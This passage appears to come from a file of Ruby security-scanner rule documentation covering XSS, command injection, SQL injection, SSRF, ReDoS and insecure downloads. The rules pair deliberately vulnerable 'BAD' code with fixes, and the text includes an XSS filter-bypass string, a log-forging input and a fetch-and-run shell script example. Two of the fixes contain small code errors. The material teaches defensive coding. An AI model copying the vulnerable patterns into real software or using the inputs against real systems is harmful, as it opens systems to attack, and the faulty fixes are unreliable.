    "help": "# Overly permissive file permissions\nWhen creating a file, POSIX systems allow permissions to be specified for owner, group and others separately. Permissions should be kept as strict as possible, preventing access to the files contents by other users.\n\n\n## Recommendation\nRestrict the file permissions of files to prevent any but the owner being able to read or write to that file\n\n\n## References\n* Wikipedia: [File system permissions](https://en.wikipedia.org/wiki/File_system_permissions).\n* Common Weakness Enumeration: [CWE-732](https://cwe.mitre.org/data/definitions/732.html).\n"
  },
  "rb/bad-tag-filter": {
    "name": "Bad HTML filtering regexp",
    "description": "Matching HTML tags using regular expressions is hard to do right, and can easily lead to security issues.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "rb/bad-tag-filter",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-116",
      "external/cwe/cwe-020",
      "external/cwe/cwe-185",
      "external/cwe/cwe-186"
    ],
    "filename": "a0047167-BadTagFilter",
    "language": "ruby",
    "help": "# Bad HTML filtering regexp\nIt is possible to match some single HTML tags using regular expressions (parsing general HTML using regular expressions is impossible). However, if the regular expression is not written well it might be possible to circumvent it, which can lead to cross-site scripting or other security issues.\n\nSome of these mistakes are caused by browsers having very forgiving HTML parsers, and will often render invalid HTML containing syntax errors. Regular expressions that attempt to match HTML should also recognize tags containing such syntax errors.\n\n\n## Recommendation\nUse a well-tested sanitization or parser library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.\n\n\n## Example\nThe following example attempts to filters out all `<script>` tags.\n\n\n```ruby\ndef filter_script_tags(html)\n  old_html = \"\"\n  while (html != old_html)\n    old_html = html\n    html = html.gsub(/<script[^>]*>.*<\\/script>/m, \"\")\n  end\n  html\nend\n\n```\nThe above sanitizer does not filter out all `<script>` tags. Browsers will not only accept `</script>` as script end tags, but also tags such as `</script foo=\"bar\">` even though it is a parser error. This means that an attack string such as `<script>alert(1)</script foo=\"bar\">` will not be filtered by the function, and `alert(1)` will be executed by a browser if the string is rendered as HTML.\n\nOther corner cases include that HTML comments can end with `--!>`, and that HTML tag names can contain upper case characters.\n\n\n## References\n* Securitum: [The Curious Case of Copy &amp; Paste](https://research.securitum.com/the-curious-case-of-copy-paste/).\n* stackoverflow.com: [You can't parse \\[X\\]HTML with regex](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags#answer-1732454).\n* HTML Standard: [Comment end bang state](https://html.spec.whatwg.org/multipage/parsing.html#comment-end-bang-state).\n* stackoverflow.com: [Why aren't browsers strict about HTML?](https://stackoverflow.com/questions/25559999/why-arent-browsers-strict-about-html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-185](https://cwe.mitre.org/data/definitions/185.html).\n* Common Weakness Enumeration: [CWE-186](https://cwe.mitre.org/data/definitions/186.html).\n"
  },
  "rb/kernel-open": {
    "name": "Use of `Kernel.open`, `IO.read` or similar sinks with user-controlled input",
    "description": "Using `Kernel.open`, `IO.read`, `IO.write`, `IO.binread`, `IO.binwrite`, `IO.foreach`, `IO.readlines`, or `URI.open` may allow a malicious user to execute arbitrary system commands.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "rb/kernel-open",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088",
      "external/cwe/cwe-073"
    ],
    "filename": "1a9e74f4-KernelOpen",
    "language": "ruby",
    "help": "# Use of `Kernel.open`, `IO.read` or similar sinks with user-controlled input\nIf `Kernel.open` is given a file name that starts with a `|` character, it will execute the remaining string as a shell command. If a malicious user can control the file name, they can execute arbitrary code. The same vulnerability applies to `IO.read`, `IO.write`, `IO.binread`, `IO.binwrite`, `IO.foreach`, `IO.readlines` and `URI.open`.\n\n\n## Recommendation\nUse `File.open` instead of `Kernel.open`, as the former does not have this vulnerability. Similarly, use the methods from the `File` class instead of the `IO` class e.g. `File.read` instead of `IO.read`.\n\nInstead of `URI.open` use `URI(..).open` or an HTTP Client.\n\n\n## Example\nThe following example shows code that calls `Kernel.open` on a user-supplied file path.\n\n\n```ruby\nrequire \"open-uri\"\n\nclass UsersController < ActionController::Base\n  def create\n    filename = params[:filename]\n    open(filename) # BAD\n\n    web_page = params[:web_page]\n    URI.open(web_page) # BAD - calls `Kernel.open` internally\n  end\nend\n\n```\nInstead, `File.open` should be used, as in the following example.\n\n\n```ruby\nclass UsersController < ActionController::Base\n  def create\n    filename = params[:filename]\n    File.open(filename)\n\n    web_page = params[:web_page]\n    Net::HTTP.get(URI.parse(web_page))\n  end\nend\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection). [Ruby on Rails Cheat Sheet: Command Injection](https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#command-injection).\n* Example CVE: [Command Injection in RDoc](https://www.ruby-lang.org/en/news/2021/05/02/os-command-injection-in-rdoc/).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n"
  },
  "rb/reflected-xss": {
    "name": "Reflected server-side cross-site scripting",
    "description": "Writing user input directly to a web page allows for a cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "sub-severity": "high",
    "precision": "high",
    "id": "rb/reflected-xss",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "130b38a5-ReflectedXSS",
    "language": "ruby",
    "help": "# Reflected server-side cross-site scripting\nDirectly writing user input (for example, an HTTP request parameter) to a webpage, without properly sanitizing the input first, allows for a cross-site scripting vulnerability.\n\n\n## Recommendation\nTo guard against cross-site scripting, escape user input before writing it to the page. Some frameworks, such as Rails, perform this escaping implicitly and by default.\n\nTake care when using methods such as `html_safe` or `raw`. They can be used to emit a string without escaping it, and should only be used when the string has already been manually escaped (for example, with the Rails `html_escape` method), or when the content is otherwise guaranteed to be safe (such as a hard-coded string).\n\n\n## Example\nThe following example is safe because the `params[:user_name]` content within the output tags will be HTML-escaped automatically before being emitted.\n\n\n```none\n<p>Hello <%= params[:user_name] %>!</p>\n\n```\nHowever, the following example is unsafe because user-controlled input is emitted without escaping, since it is marked as `html_safe`.\n\n\n```none\n<p>Hello <%= params[:user_name].html_safe %>!</p>\n\n```\n\n## References\n* OWASP: [XSS Ruby on Rails Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#cross-site-scripting-xss).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "rb/sql-injection": {
    "name": "SQL query built from user-controlled sources",
    "description": "Building a SQL query from user-controlled sources is vulnerable to insertion of malicious SQL code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "high",
    "id": "rb/sql-injection",
    "tags": [
      "security",
      "external/cwe/cwe-089"
    ],
    "filename": "f1d09972-SqlInjection",
    "language": "ruby",
    "help": "# SQL query built from user-controlled sources\nIf a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run malicious database queries.\n\n\n## Recommendation\nMost database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.\n\n\n## Example\nIn the following Rails example, an `ActionController` class has a `text_bio` method to handle requests to fetch a biography for a specified user.\n\nThe user is specified using a parameter, `user_name` provided by the client. This value is accessible using the `params` method.\n\nThe method illustrates three different ways to construct and execute an SQL query to find the user by name.\n\nIn the first case, the parameter `user_name` is inserted into an SQL fragment using string interpolation. The parameter is user-supplied and is not sanitized. An attacker could use this to construct SQL queries that were not intended to be executed here.\n\nThe second case uses string concatenation and is vulnerable in the same way that the first case is.\n\nIn the third case, the name is passed in a hash instead. `ActiveRecord` will construct a parameterized SQL query that is not vulnerable to SQL injection attacks.\n\n\n```ruby\nclass UserController < ActionController::Base\n  def text_bio\n    # BAD -- Using string interpolation\n    user = User.find_by \"name = '#{params[:user_name]}'\"\n\n    # BAD -- Using string concatenation\n    find_str = \"name = '\" + params[:user_name] + \"'\"\n    user = User.find_by(find_str)\n\n    # GOOD -- Using a hash to parameterize arguments\n    user = User.find_by name: params[:user_name]\n\n    render plain: user&.text_bio\n  end\nend\n\n```\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* OWASP: [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n"
  },
  "rb/log-injection": {
    "name": "Log injection",
    "description": "Building log entries from user-controlled sources is vulnerable to insertion of forged log entries by a malicious user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "medium",
    "id": "rb/log-injection",
    "tags": [
      "security",
      "external/cwe/cwe-117"
    ],
    "filename": "013e688d-LogInjection",
    "language": "ruby",
    "help": "# Log injection\nIf unsanitized user input is written to a log entry, a malicious user may able to forge new log entries.\n\nForgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.\n\n\n## Recommendation\nUser input should be suitably sanitized before it is logged. Suitable means of sanitization depend on how the log entries will be displayed or consumed.\n\nIf the log entries are in plain text then line breaks should be removed from user input, using `String#gsub` or similar. Care should also be taken that user input is clearly marked in log entries.\n\nFor log entries that will be displayed in HTML, user input should be HTML-encoded before being logged, to prevent forgery and other forms of HTML injection.\n\n\n## Example\nIn the example, a username, provided by the user, is logged using \\`Logger\\#info\\`.\n\nIn the first case, it is logged without any sanitization. If a malicious user provides \\`username=Guest%0a\\[INFO\\]+User:+Admin%0a\\` as a username parameter, the log entry will be split in two different lines, where the second line will be \\`\\[INFO\\]+User:+Admin\\`.\n\n\n```ruby\nrequire 'logger'\n\nclass UsersController < ApplicationController\n  def login\n    logger = Logger.new STDOUT\n    username = params[:username]\n\n    # BAD: log message constructed with unsanitized user input\n    logger.info \"attempting to login user: \" + username\n\n    # ... login logic ...\n  end\nend\n\n```\nIn the second example, `String#gsub` is used to ensure no line endings are present in the user input.\n\n\n```ruby\nrequire 'logger'\n\nclass UsersController < ApplicationController\n  def login\n    logger = Logger.new STDOUT\n    username = params[:username]\n\n    # GOOD: log message constructed with sanitized user input\n    logger.info \"attempting to login user: \" + sanitized_username.gsub(\"\\n\", \"\")\n\n    # ... login logic ...\n  end\nend\n\n```\n\n## References\n* OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).\n* Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).\n"
  },
  "rb/insecure-dependency": {
    "name": "Dependency download using unencrypted communication channel",
    "description": "Using unencrypted protocols to fetch dependencies can leave an application open to man-in-the-middle attacks.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.1,
    "precision": "high",
    "id": "rb/insecure-dependency",
    "tags": [
      "security",
      "external/cwe/cwe-300",
      "external/cwe/cwe-319",
      "external/cwe/cwe-494",
      "external/cwe/cwe-829"
    ],
    "filename": "5694c85a-InsecureDependencyResolution",
    "language": "ruby",
    "help": "# Dependency download using unencrypted communication channel\nUsing an insecure protocol like HTTP or FTP to download dependencies makes the build process vulnerable to a man-in-the-middle (MITM) attack.\n\nThis can allow attackers to inject malicious code into the downloaded dependencies, and thereby infect the build artifacts and execute arbitrary code on the machine building the artifacts.\n\n\n## Recommendation\nAlways use a secure protocol, such as HTTPS or SFTP, when downloading artifacts from a URL.\n\n\n## Example\nThe below example shows a `Gemfile` that specifies a gem source using the insecure HTTP protocol.\n\n\n```ruby\nsource \"http://rubygems.org\"\n\ngem \"my-gem-a\", \"1.2.3\"\n```\nThe fix is to change the protocol to HTTPS.\n\n\n```ruby\nsource \"https://rubygems.org\"\n\ngem \"my-gem-a\", \"1.2.3\"\n```\n\n## References\n* Jonathan Leitschuh: [ Want to take over the Java ecosystem? All you need is a MITM! ](https://infosecwriteups.com/want-to-take-over-the-java-ecosystem-all-you-need-is-a-mitm-1fc329d898fb)\n* Max Veytsman: [ How to take over the computer of any Java (or Clojure or Scala) Developer. ](https://max.computer/blog/how-to-take-over-the-computer-of-any-java-or-clojure-or-scala-developer/)\n* Wikipedia: [Supply chain attack.](https://en.wikipedia.org/wiki/Supply_chain_attack)\n* Wikipedia: [Man-in-the-middle attack.](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)\n* Common Weakness Enumeration: [CWE-300](https://cwe.mitre.org/data/definitions/300.html).\n* Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).\n* Common Weakness Enumeration: [CWE-494](https://cwe.mitre.org/data/definitions/494.html).\n* Common Weakness Enumeration: [CWE-829](https://cwe.mitre.org/data/definitions/829.html).\n"
  },
  "rb/request-without-cert-validation": {
    "name": "Request without certificate validation",
    "description": "Making a request without certificate validation can allow man-in-the-middle attacks.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "rb/request-without-cert-validation",
    "tags": [
      "security",
      "external/cwe/cwe-295"
    ],
    "filename": "bbfdf004-RequestWithoutValidation",
    "language": "ruby",
    "help": "# Request without certificate validation\nCertificate validation is the standard authentication method of a secure TLS connection. Without it, there is no guarantee about who the other party of a TLS connection is, making man-in-the-middle attacks more likely to occur.\n\nWhen testing software that uses TLS connections, it may be useful to disable the certificate validation temporarily. But disabling it in production environments is strongly discouraged, unless an alternative method of authentication is used.\n\n\n## Recommendation\nDo not disable certificate validation for TLS connections.\n\n\n## Example\nThe following example shows an HTTPS connection that makes a GET request to a remote server. But the connection is not secure since the `verify_mode` option of the connection is set to `OpenSSL::SSL::VERIFY_NONE`. As a consequence, anyone can impersonate the remote server.\n\n\n```ruby\nrequire \"net/https\"\nrequire \"uri\"\n\nuri = URI.parse \"https://example.com/\"\nhttp = Net::HTTP.new uri.host, uri.port\nhttp.use_ssl = true\nhttp.verify_mode = OpenSSL::SSL::VERIFY_NONE\nrequest = Net::HTTP::Get.new uri.request_uri\nputs http.request(request).body\n\n```\nTo make the connection secure, the `verify_mode` option should have its default value, or be explicitly set to `OpenSSL::SSL::VERIFY_PEER`.\n\n\n## References\n* Wikipedia: [Transport Layer Security (TLS)](https://en.wikipedia.org/wiki/Transport_Layer_Security)\n* Wikipedia: [Man-in-the-middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)\n* Ruby-doc: [Net::HTTP](https://ruby-doc.org/stdlib-3.0.2/libdoc/net/http/rdoc/Net/HTTP.html)\n* Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).\n"
  },
  "rb/sensitive-get-query": {
    "name": "Sensitive data read from GET request",
    "description": "Placing sensitive data in a GET request increases the risk of the data being exposed to an attacker.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 6.5,
    "precision": "high",
    "id": "rb/sensitive-get-query",
    "tags": [
      "security",
      "external/cwe/cwe-598"
    ],
    "filename": "981980ad-SensitiveGetQuery",
    "language": "ruby",
    "help": "# Sensitive data read from GET request\nSensitive information such as passwords should not be transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing sensitive information into the URL therefore increases the risk that it will be captured by an attacker.\n\n\n## Recommendation\nUse HTTP POST to send sensitive information as part of the request body; for example, as form data.\n\n\n## Example\nThe following example shows two route handlers that both receive a username and a password. The first receives this sensitive information from the query parameters of a GET request, which is transmitted in the URL. The second receives this sensitive information from the request body of a POST request.\n\n\n```ruby\nRails.application.routes.draw do\n  get \"users/login\", to: \"#login_get\" # BAD: sensitive data transmitted through query parameters\n  post \"users/login\", to: \"users#login_post\" # GOOD: sensitive data transmitted in the request body\nend\n\n```\n\n```ruby\nclass UsersController < ActionController::Base\n  def login_get\n    password = params[:password]\n    authenticate_user(params[:username], password)\n  end\n\n  def login_post\n    password = params[:password]\n    authenticate_user(params[:username], password)\n  end\n\n  private\n  def authenticate_user(username, password)\n    # ... authenticate the user here\n  end\nend\n\n```\n\n## References\n* CWE: [CWE-598: Use of GET Request Method with Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)\n* PortSwigger (Burp): [Password Submitted using GET Method](https://portswigger.net/kb/issues/00400300_password-submitted-using-get-method)\n* OWASP: [Information Exposure through Query Strings in URL](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)\n* Common Weakness Enumeration: [CWE-598](https://cwe.mitre.org/data/definitions/598.html).\n"
  },
  "rb/html-constructed-from-input": {
    "name": "Unsafe HTML constructed from library input",
    "description": "Using externally controlled strings to construct HTML might allow a malicious user to perform a cross-site scripting attack.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "rb/html-constructed-from-input",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "130b38a5-UnsafeHtmlConstruction",
    "language": "ruby",
    "help": "# Unsafe HTML constructed from library input\nWhen a library function dynamically constructs HTML in a potentially unsafe way, then it's important to document to clients of the library that the function should only be used with trusted inputs. If the function is not documented as being potentially unsafe, then a client may inadvertently use inputs containing unsafe HTML fragments, and thereby leave the client vulnerable to cross-site scripting attacks.\n\n\n## Recommendation\nDocument all library functions that can lead to cross-site scripting attacks, and guard against unsafe inputs where dynamic HTML construction is not intended.\n\n\n## Example\nThe following example has a library function that renders a boldface name by creating a string containing a `<b>` with the name embedded in it.\n\n\n```ruby\nclass UsersController < ActionController::Base\n  # BAD - create a user description, where the name is not escaped\n  def create_user_description (name)\n    \"<b>#{name}</b>\".html_safe\n  end\nend\n\n```\nThis library function, however, does not escape unsafe HTML, and a client that calls the function with user-supplied input may be vulnerable to cross-site scripting attacks.\n\nThe library could either document that this function should not be used with unsafe inputs, or escape the input before embedding it in the HTML fragment.\n\n\n```ruby\nclass UsersController < ActionController::Base\n  # Good - create a user description, where the name is escaped\n  def create_user_description (name)\n    \"<b>#{ERB::Util.html_escape(name)}</b>\".html_safe\n  end\nend\n\n```\n\n## References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet).\n* OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).\n* OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "rb/stack-trace-exposure": {
    "name": "Information exposure through an exception",
    "description": "Leaking information about an exception, such as messages and stack traces, to an external user can expose implementation details that are useful to an attacker for developing a subsequent exploit.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 5.4,
    "precision": "high",
    "id": "rb/stack-trace-exposure",
    "tags": [
      "security",
      "external/cwe/cwe-209",
      "external/cwe/cwe-497"
    ],
    "filename": "c88b1f6a-StackTraceExposure",
    "language": "ruby",
    "help": "# Information exposure through an exception\nSoftware developers often add stack traces to error messages, as a debugging aid. Whenever that error message occurs for an end user, the developer can use the stack trace to help identify how to fix the problem. In particular, stack traces can tell the developer more about the sequence of events that led to a failure, as opposed to merely the final state of the software when the error occurred.\n\nUnfortunately, the same information can be useful to an attacker. The sequence of class or method names in a stack trace can reveal the structure of the application as well as any internal components it relies on. Furthermore, the error message at the top of a stack trace can include information such as server-side file names and SQL code that the application relies on, allowing an attacker to fine-tune a subsequent injection attack.\n\n\n## Recommendation\nSend the user a more generic error message that reveals less information. Either suppress the stack trace entirely, or log it only on the server.\n\n\n## Example\nIn the following example, an exception is handled in two different ways. In the first version, labeled BAD, the exception is exposed to the remote user by rendering it as an HTTP response. As such, the user is able to see a detailed stack trace, which may contain sensitive information. In the second version, the error message is logged only on the server, and a generic error message is displayed to the user. That way, the developers can still access and use the error log, but remote users will not see the information.\n\n\n```ruby\nclass UsersController < ApplicationController\n\n  def update_bad(id)\n    do_computation()\n  rescue => e\n    # BAD\n    render body: e.backtrace, content_type: \"text/plain\"\n  end\n\n  def update_good(id)\n    do_computation()\n  rescue => e\n    # GOOD\n    logger.error e.backtrace\n    render body: \"Computation failed\", content_type: \"text/plain\"\n  end\n\nend\n```\n\n## References\n* OWASP: [Improper Error Handling](https://owasp.org/www-community/Improper_Error_Handling).\n* Common Weakness Enumeration: [CWE-209](https://cwe.mitre.org/data/definitions/209.html).\n* Common Weakness Enumeration: [CWE-497](https://cwe.mitre.org/data/definitions/497.html).\n"
  },
  "rb/regexp-injection": {
    "name": "Regular expression injection",
    "description": "User input should not be used in regular expressions without first being escaped. Otherwise, a malicious user may be able to inject an expression that could require exponential time on certain inputs.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "rb/regexp-injection",
    "tags": [
      "security",
      "external/cwe/cwe-1333",
      "external/cwe/cwe-730",
      "external/cwe/cwe-400"
    ],
    "filename": "23705fa4-RegExpInjection",
    "language": "ruby",
    "help": "# Regular expression injection\nConstructing a regular expression with unsanitized user input is dangerous, since a malicious user may be able to modify the meaning of the expression. In particular, such a user may be able to provide a regular expression fragment that takes exponential time in the worst case, and use that to perform a Denial of Service attack.\n\n\n## Recommendation\nBefore embedding user input into a regular expression, use a sanitization function such as `Regexp.escape` to escape meta-characters that have special meaning.\n\n\n## Example\nThe following examples construct regular expressions from an HTTP request parameter without sanitizing it first:\n\n\n```ruby\nclass UsersController < ActionController::Base\n  def first_example\n    # BAD: Unsanitized user input is used to construct a regular expression\n    regex = /#{ params[:key] }/\n  end\n\n  def second_example\n    # BAD: Unsanitized user input is used to construct a regular expression\n    regex = Regexp.new(params[:key])\n  end\nend\n```\nInstead, the request parameter should be sanitized first. This ensures that the user cannot insert characters that have special meanings in regular expressions.\n\n\n```ruby\nclass UsersController < ActionController::Base\n  def example\n    # GOOD: User input is sanitized before constructing the regular expression\n    regex = Regexp.new(Regex.escape(params[:key]))\n  end\nend\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Ruby: [Regexp.escape](https://ruby-doc.org/core-3.0.2/Regexp.html#method-c-escape).\n* Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "rb/insecure-download": {
    "name": "Download of sensitive file through insecure connection",
    "description": "Downloading executables and other sensitive files over an insecure connection may allow man-in-the-middle attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.1,
    "precision": "high",
    "id": "rb/insecure-download",
    "tags": [
      "security",
      "external/cwe/cwe-829"
    ],
    "filename": "db6960ea-InsecureDownload",
    "language": "ruby",
    "help": "# Download of sensitive file through insecure connection\nDownloading executables or other sensitive files over an unencrypted connection can leave a server open to man-in-the-middle attacks (MITM). Such an attack can allow an attacker to insert arbitrary content into the downloaded file, and in the worst case, allow the attacker to execute arbitrary code on the vulnerable system.\n\n\n## Recommendation\nUse a secure transfer protocol when downloading executables or other sensitive files.\n\n\n## Example\nIn this example, a server downloads a shell script from a remote URL and then executes the script.\n\n\n```ruby\nrequire \"net/http\"\n\nscript = Net::HTTP.new(\"http://mydownload.example.org\").get(\"/myscript.sh\").body\nsystem(script)\n```\nThe HTTP protocol is vulnerable to MITM, and thus an attacker could potentially replace the downloaded shell script with arbitrary code, which gives the attacker complete control over the system.\n\nThe issue has been fixed in the example below by replacing the HTTP protocol with the HTTPS protocol.\n\n\n```ruby\nrequire \"net/http\"\n\nscript = Net::HTTP.new(\"https://mydownload.example.org\").get(\"/myscript.sh\").body\nsystem(script)\n```\n\n## References\n* Wikipedia: [Man-in-the-middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)\n* Common Weakness Enumeration: [CWE-829](https://cwe.mitre.org/data/definitions/829.html).\n"
  },
  "rb/request-forgery": {
    "name": "Server-side request forgery",
    "description": "Making a network request with user-controlled data in the URL allows for request forgery attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.1,
    "precision": "high",
    "id": "rb/request-forgery",
    "tags": [
      "security",
      "external/cwe/cwe-918"
    ],
    "filename": "578c633b-ServerSideRequestForgery",
    "language": "ruby",
    "help": "# Server-side request forgery\nDirectly incorporating user input into an HTTP request without validating the input can facilitate server-side request forgery (SSRF) attacks. In these attacks, the request may be changed, directed at a different server, or via a different protocol. This can allow the attacker to obtain sensitive information or perform actions with escalated privilege.\n\n\n## Recommendation\nTo guard against SSRF attacks you should avoid putting user-provided input directly into a request URL. Instead, maintain a list of authorized URLs on the server; then choose from that list based on the input provided. Alternatively, ensure requests constructed from user input are limited to a particular host or more restrictive URL prefix.\n\n\n## Example\nThe following example shows an HTTP request parameter being used directly to form a new request without validating the input, which facilitates SSRF attacks. It also shows how to remedy the problem by validating the user input against a known fixed string.\n\n\n```ruby\nrequire \"excon\"\nrequire \"json\"\n\nclass PostsController < ActionController::Base\n  def create\n    user = params[:user_id]\n\n    # BAD - user can control the entire URL of the request\n    users_service_domain = params[:users_service_domain]\n    response = Excon.post(\"#{users_service_domain}/logins\", body: {user_id: user}).body\n    token = JSON.parse(response)[\"token\"]\n\n    # GOOD - path is validated against a known fixed string\n    path = if params[:users_service_path] == \"v1/users\"\n             \"v1/users\"\n           else \n             \"v2/users\"\n           end\n    response = Excon.post(\"users-service/#{path}\", body: {user_id: user}).body\n    token = JSON.parse(response)[\"token\"]\n\n    @post = Post.create(params[:post].merge(user_token: token))\n    render @post\n  end\nend\n\n```\n\n## References\n* [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)\n* Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).\n"
  },
  "rb/redos": {
    "name": "Inefficient regular expression",
    "description": "A regular expression that requires exponential time to match certain inputs can be a performance bottleneck, and may be vulnerable to denial-of-service attacks.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "rb/redos",
    "tags": [
      "security",
      "external/cwe/cwe-1333",
      "external/cwe/cwe-730",
      "external/cwe/cwe-400"
    ],
    "filename": "23705fa4-ReDoS",
    "language": "ruby",
    "help": "# Inefficient regular expression\nSome regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service (\"DoS\") attack by crafting an expensive input string for the regular expression to match.\n\nThe regular expression engine used by the Ruby interpreter (MRI) uses backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.\n\nNote that Ruby 3.2 and later have implemented a caching mechanism that completely eliminates the worst-case time complexity for the regular expressions flagged by this query. The regular expressions flagged by this query are therefore only problematic for Ruby versions prior to 3.2.\n\nTypically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.\n\n\n## Recommendation\nModify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.\n\n\n## Example\nConsider this regular expression:\n\n```ruby\n\n/^_(__|.)+_$/\n```\nIts sub-expression `\"(__|.)+?\"` can match the string `\"__\"` either by the first alternative `\"__\"` to the left of the `\"|\"` operator, or by two repetitions of the second alternative `\".\"` to the right. Thus, a string consisting of an odd number of underscores followed by some other character will cause the regular expression engine to run for an exponential amount of time before rejecting the input.\n\nThis problem can be avoided by rewriting the regular expression to remove the ambiguity between the two branches of the alternative inside the repetition:\n\n```ruby\n\n/^_(__|[^_])+_$/\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n* James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).\n* Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: 